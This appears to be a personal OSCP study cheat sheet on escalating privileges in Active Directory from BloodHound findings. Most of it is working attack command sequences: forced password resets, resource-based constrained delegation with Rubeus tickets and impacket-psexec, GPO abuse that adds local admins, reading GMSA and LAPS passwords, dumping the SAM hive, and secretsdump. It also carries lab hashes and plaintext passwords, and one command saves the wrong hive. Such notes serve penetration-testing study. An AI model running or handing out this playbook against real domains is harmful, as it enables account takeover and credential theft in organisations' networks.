# Bloodhound Privesc

References are taken from [ippsec.rocks](http://ippsec.rocks) and this video

[10 AD PrivEsc Concepts You MUST Know for Mastering OSCP](https://youtu.be/xowytiyooBk)

Also, PayloadAllThethings lists some of these vulnerabilities along with multiple tools you can use to exploit them

[PayloadsAllTheThings/Active Directory Attack.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

In addition to bloodhound python, you can use rusthound to collect data remotely (incase [bloodhound.py](http://bloodhound.py) is giving you issues).

Or 

```mermaid
invoke-bloodhound
```

Also, note that Crackmapexec uses only the LM hash, like:

```bash
cme winrm 192.168.94.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
```

Don’t use `cme winrm 192.168.94.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808:19a3a7550ce8c505c2d46b5e39d6f808'`

# SharpHound.exe

To collect absolutely everything,

```bash
.\SharpHound.exe -c all,gpolocalgroup
```

# Bloodhound

**Note:** Sometimes to find the privesc vector, you need to click on your owned node and check inbound and outbound rights (you’ll need to click twice on them). Check the “Transitive Object Control” option.

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled.png)

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%201.png)

# GenericAll/GenericWrite

### Generic All to a user

This priviledge allows you to abuse ACLs to change the password of a user account. 

```nasm
Set-AdAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -force)
```

### GenericAll to a group

Add a new user to the group

```bash
net group "Account Operators" <my_user> /add /domain
```

### GenericAll to a Computer

### Resource-Based Constrained delegation

This allows for resource-based constrained delegation. Add a new user to the computer.

[Resource-based Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)

```bash
# method 1, using powermad to create machine
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Set-ADComputer ResourceDC(targetcomputer) -PrincipalsAllowedToDelegateToAccount SERVICEA$

# method 2, using StandIn.exe. Tends to work more consistently
.\StandIn_v13_Net45.exe --computer purple --make
#[?] Using DC    : ResourceDC.resourced.local
 #   |_ Domain   : resourced.local
  #  |_ DN       : CN=purple,CN=Computers,DC=resourced,DC=local
   # |_ Password : DB9zGzkt4TKuiQP <<<<----- [YOUR PASSWORD IS HERE]
.\StandIn_v13_Net45.exe --delegation # shows accounts with resource-based constrained delegation permissions
Get-ADComputer -Filter * | select-object name, sid #get the sid of the new computer 
# S-1-5-21-537427935-490066102-1511301751-4101
.\StandIn_v13_Net45.exe --computer ResourceDC --sid S-1-5-21-537427935-490066102-1511301751-4101 # give the computer privileges to act on behalf of other users

# use rubeus after both either method of adding a machine account
.\Rubeus.exe hash /password:123456 /user:SERVICEA$ /domain:resourced.local
.\rubeus.exe s4u /user:SERVICEA$ /aes256:8414A4894255194EA1E599813B167F2D28EC6ABB3302C69E1F079B12C260FCF9 /aes128:E47F3B5F5BB30029DC3C8612944D5ACE /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /domain:resourced.local /ptt
```

Run `klist` to see your imported ticket

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%202.png)

You can’t really do much when it’s loaded locally like this, so you should try and use it remotely with psexec.

To do this, copy the base64 of the ticket outputed by Rubeus.

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%203.png)

format it in a file so that it is all in one line without spaces (use `%j` in vim to put it all on one line). Then base64 decode this file.

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%204.png)

Convert it to `ccache` format with ticketconverter from impacket. Finally, PsExec into the machine as administrator.

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=`pwd`/ticket.ccache
impacket-psexec -dc-ip 192.168.141.175 resourced.local/administrator@resourcedc.resourced.local -k -no-pass
	# you can also do secrets dump to PTH with the admin hash if psexec isn't working
impacket-secretsdump -k -no-pass -dc-ip 192.168.141.175 resourced.local/administrator@resourcedc.resourced.local 
```

See this video for a walkthrough: [https://youtu.be/xMTCZt5DRB0](https://youtu.be/xMTCZt5DRB0)

See this blog to get more info on pass the ticket: [https://pythonforcybersecurity.com/lessons/lab-1lateral-movement-pass-the-ticket-attack/](https://pythonforcybersecurity.com/lessons/lab-1lateral-movement-pass-the-ticket-attack/)

### Method 2 of resource-based constrained delegation

This uses impacket, rubeus, and powerview

```bash
$ impacket-addcomputer -dc-ip 192.168.52.175 -hashes 19a3a7550ce8c505c2d46b5e39d6f808:19a3a7550ce8c505c2d46b5e39d6f808 -computer-name virusspec -computer-pass virusspec  resourced.local/l.livingstone

# check that computer was added
*Evil-WinRM* PS C:\temp> Get-DomainComputer virusspec
```

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%205.png)

Give it ability to delegate to account

```bash
Set-ADComputer resourcedc -PrincipalsAllowedToDelegateToAccount virusspec$
Get-ADComputer resourcedc -Properties PrincipalsAllowedToDelegateToAccount
```

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%206.png)

Get hashes of account and generate ticket

```bash
.\Rubeus.exe hash /password:virusspec /user:virusspec$ /domain:resourced.local
.\rubeus.exe s4u /user:virusspec$ /aes256:13CFBF4DC91A29C85350DB95FB535490BCBC3EBE68E9202520B8E4E84DFBD4F9 /aes128:C465E916E526790A0BCB29F0940C5464 /rc4:C6AF05D4D2B464CB7EEB12DF769F8C41 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /domain:resourced.local /ptt /nowrap /altservice:cifs,host
```

## Generic Write to a GPO (Group Policy Object)

This article will explain what you need to know in terms of theory from the perspective of a red-teamer: [https://wald0.com/?p=179](https://wald0.com/?p=179). It also explains that dotted lines in Bloodhound means that inheritence is blocked, which doesn’t necessarily mean that your exploit won’t work. Harmj0y writes more about [how to abuse GPO permissions](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/).

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%207.png)

You can also verify these privileges with `Get-GPPermission` from powerview.

```bash
Get-NetGPO # to find GUID of GPO
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
```

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%208.png)

You can pretty much do anything with GPO. In order for you changes to take place, you can make your own GPT.ini file, use New-GPOImmediateTask, or SharpGPOAbuse.exe.

### SharpGPOAbuse.exe (preferred, more likely to work)

```bash
# get sharp GPO
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe

# in evil-winrm
upload SharpGPOAbuse.exe
# replace "anirudh" with your user with GenericWrite and "GPOName" with the name of your GPO
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

After running SharpGPOAbuse.exe, update the local group policy for the changes to take effect.

```bash
gpupdate /force
```

You’ll see that our user was added to administrators

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%209.png)

### New-GPOImmediateTask

Another way to exploit this is to use [PowerView’s `New-GPOImmediateTask` function](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1). This works by creating a scheduled task and immediately executing it. It might not come in the script so just execute it here: [https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1). 

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

# ReadGMSAPassword

This allows you to read the randomly-generated password of a Group Managed Service Account (GMSA). [Look here](https://youtu.be/c8Qbloh6Lqg?t=3715) for ippsec doing it on Search.htb

```nasm
$gmsa = get-adserviceaccount [CN=_OF_ACCOUNT] -properties msDS-MnanagedPassword
$mp = $gmsa.'msDS-ManagedPassword'

$secpwd = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
$cred = New-Object System.Automation.PSCredential "[CN=_OF_ACCOUNT]",$secpwd
# test that it works
Invoke-Command -ComputerName 127.0.0.1 -cred $cred -ScriptBlock {whoami}
```

 You could then proceed to change the password of the user whose credentials you have as shown in this [code block](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05.md) if you want to wmi-exec into their account.

# ForceChangePassword

Requires `PowerView.ps1` module.

```nasm
$newpass = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force
Set-DomainUserPassword -Identity Smith -AccountPassword $newpass
```

# SeBackupPriv

Tutorial derived from [here](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/). Basically make copies of the SAM and SYSTEM files from the registry and extract the creds with pypykatz.

```abap
#evil-winrm
reg save hklm\sam c:\Temp\sam
reg save hklm\sam c:\Temp\system
download C:\Temp\sam
download C:\Temp\system

$ pypykatz registry --sam sam system
```

# ReadLAPSPassword

### Bloohound help menu:

The user FMCSORLEY@HUTCH.OFFSEC has the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer HUTCHDC.HUTCH.OFFSEC.

The local administrator password for a computer managed by LAPS is stored in the confidential LDAP attribute, "ms-mcs-AdmPwd".

To abuse this privilege with PowerView's Get-DomainObject, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as FMCSORLEY@HUTCH.OFFSEC if you are not running a process as that user. To do this in conjunction with Get-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
```

Then, use Get-DomainObject, optionally specifying $Cred if you are not already running a process as FMCSORLEY@HUTCH.OFFSEC:

```
Get-DomainObject windows1 -Credential $Cred -Properties "ms-mcs-AdmPwd",name
```

### Dumping LAPS

If you don’t have a session, you can use Ldapsearch to dump the LAPS password as shown in this blogpost.

[Dump LAPS passwords with ldapsearch](https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/)

```bash
ldapsearch -x -h 192.168.80.10 -D \
"usernamehere" -w ASDqwe123 -b "dc=sittingduck,dc=info" \
"(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

You can also get this through crackmapexec.

```bash
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```

This one worked for me

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%2010.png)

You can now winrm in as the local Administrator

![Untitled](Bloodhound%20Privesc%20dd6fade960264426a07c9c342c846f05/Untitled%2011.png)

Can optionally dump all the hashes with secretsdump.py to fully pwn the system.

```bash
secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@192.168.23.122
```

# ForceChangePassword

https://wald0.com/?p=112

Reference wald0 to show how you can use this